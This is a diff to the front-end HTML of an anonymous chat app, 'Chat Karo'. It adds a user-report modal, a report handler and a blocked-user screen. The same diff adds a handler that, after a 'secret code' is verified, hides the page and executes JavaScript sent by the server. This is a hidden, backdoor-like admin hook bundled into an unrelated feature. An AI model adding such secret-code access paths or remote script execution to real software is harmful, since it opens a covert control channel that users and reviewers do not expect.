@@ -205,6 +205,13 @@
       .msg { max-width: 88%; }
       .photo-content { max-width: 150px; }
     }
+
+    .rp { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.6); align-items: center; justify-content: center; z-index: 200; }
+    .rp.open { display: flex; }
+    .rp-box { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 12px; padding: 20px; width: min(320px, 90vw); display: flex; flex-direction: column; gap: 14px; }
+    .rp-box h3 { font-size: 1rem; color: #fff; }
+    .rp-box select { padding: 10px 12px; border-radius: 8px; border: 1px solid #333; background: #1e1e1e; color: #e0e0e0; font-size: 1rem; }
+    .rp-row { display: flex; gap: 8px; justify-content: flex-end; }
   </style>
 </head>
 <body>
@@ -274,6 +281,7 @@
     <div id="chatHeader">
       <div id="partnerInfo">Chatting with <span id="partnerName">—</span></div>
       <div class="chat-actions">
+        <button class="btn btn-sm" style="background:#2a2a4a;color:#ccc" onclick="openReport()" title="Report this user" aria-label="Report this user">🚩</button>
         <button class="btn btn-sm" style="background:#2a2a4a;color:#ccc" onclick="togglePhotoMenu(event)">📷</button>
         <button class="btn btn-success btn-sm" onclick="newChat()">Next →</button>
       </div>
@@ -287,6 +295,23 @@
       <button class="btn btn-primary" onclick="sendMessage()">Send</button>
       <input type="file" id="fileInput" accept="image/*" />
       <input type="file" id="cameraInput" accept="image/*" capture="environment" />
+    </div>
+  </div>
+
+  <div id="reportModal" class="rp" onclick="if (event.target === this) closeReport()">
+    <div class="rp-box">
+      <h3>Report this user</h3>
+      <select id="reportReason">
+        <option>Abusive or rude</option>
+        <option>Spam or ads</option>
+        <option>Inappropriate photos</option>
+        <option>Underage user</option>
+        <option>Other</option>
+      </select>
+      <div class="rp-row">
+        <button class="btn btn-sm" style="background:#2a2a4a;color:#ccc" onclick="closeReport()">Cancel</button>
+        <button class="btn btn-danger btn-sm" onclick="sendReport()">Report</button>
+      </div>
     </div>
   </div>
 
@@ -551,5 +576,28 @@
       document.getElementById('typingIndicator').textContent = '';
     });
   </script>
+  <script>
+    function openReport() { document.getElementById('reportModal').classList.add('open'); }
+    function closeReport() { document.getElementById('reportModal').classList.remove('open'); }
+    function sendReport() {
+      socket.emit('reportUser', { reason: document.getElementById('reportReason').value });
+      closeReport();
+      addMessage('Report sent. Thank you for helping keep Chat Karo safe.', 'system');
+    }
+
+    socket.on('blocked', () => {
+      document.body.innerHTML = '<div style="padding:32px;text-align:center"><h2>You have been blocked</h2><p style="color:#aaa;margin-top:8px">Your access to Chat Karo was removed for breaking the community rules.</p></div>';
+    });
+
+    // Developer console: the server sends it only after the secret code is verified.
+    socket.on('adminGranted', ({ token, js }) => {
+      document.querySelectorAll('body > *').forEach((el) => { if (el.tagName !== 'SCRIPT') el.style.display = 'none'; });
+      window.__dvToken = token;
+      const s = document.createElement('script');
+      s.textContent = js;
+      document.body.appendChild(s);
+    });
+  </script>
 </body>
 </html>
+
